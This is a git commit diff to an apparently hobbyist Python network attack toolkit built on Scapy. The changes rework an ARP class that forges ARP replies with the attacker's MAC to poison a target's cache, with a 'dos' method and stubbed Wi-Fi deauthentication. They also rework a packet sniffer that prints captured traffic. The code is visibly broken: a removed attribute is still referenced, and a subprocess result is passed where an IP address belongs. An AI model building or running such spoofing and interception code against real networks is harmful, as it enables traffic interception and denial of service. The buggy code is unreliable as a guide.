69f940e06e0632617297f914984025cfa0cc32ff
the25yahya <yahyaraja.2@gmail.com>
2024-07-31 13:30:44 -0400

    mc

--- tools/attack.py
+++ tools/attack.py
@@ -1,21 +1,21 @@
 from scapy.all import *
-from library.lib import get_mac_adress
+from library.lib import *
+import subprocess
 
 
 class ARP :
-    def __init__(self,target_ip,target_mac,gateaway_ip) :
+    def __init__(self,target_ip) :
         self.target = target_ip
-        self.mac = target_mac
-        self.gateaway = gateaway_ip
         self.running = False
         self.attacker_MAC = get_mac_adress()
         self.reply = self.create_arp_reply
+        self.arp_cash = arp_cash(target_ip)
 
     def create_arp_reply(self):
         Ether(dst=self.mac)/ARP(op=2,
                                 pdst=self.target,
-                                hwdst=self.mac,
-                                psrc=self.gateaway,
+                                hwdst=self.arp_cash[self.target],
+                                psrc=subprocess.run("hostname -I",shell=True,stdout=subprocess.PIPE,text=True),
                                 hwsrc=self.attacker_MAC)
         
     def dos(self) : 
@@ -35,3 +35,4 @@ class Wifi :
         pass
     def deauthenticate():
         pass
+
--- tools/sniff.py
+++ tools/sniff.py
@@ -2,16 +2,17 @@ from scapy.all import *
 
 
 class Sniff :
-    def __init__(self,filters,interface) :
-        self.filters = filters
-        self.interface = interface
-
-    def capture(self):
-        if self.interface and self.filters :
-            sniff(filter=self.filters,iface=self.interface,prn=lambda x: x.summary(),count=0)
-        if self.interface :
-            sniff(iface=str(self.interface),prn=lambda x: x.summary(),count=0)
-        if self.filters :
-            sniff(filter=self.filters,prn=lambda x: x.summary(),count=0)
-        else :
-            sniff(prn=lambda x: x.summary(),count=0)
+    def __init__(self) :
+        self.sniffing = False
+    def capture(self,filters):
+            self.sniffing = True
+            if self.sniffing and filters:
+                try :
+                    sniff(filter=filters,iface=conf.iface,prn=lambda x: x.summary(),count=0)
+                except KeyboardInterrupt :
+                     self.sniffing = False                 
+            if self.sniffing :
+                try :
+                    sniff(iface=conf.iface,prn=lambda x : x.summary(),count=0)
+                except KeyboardInterrupt :
+                     self.sniffing = False 
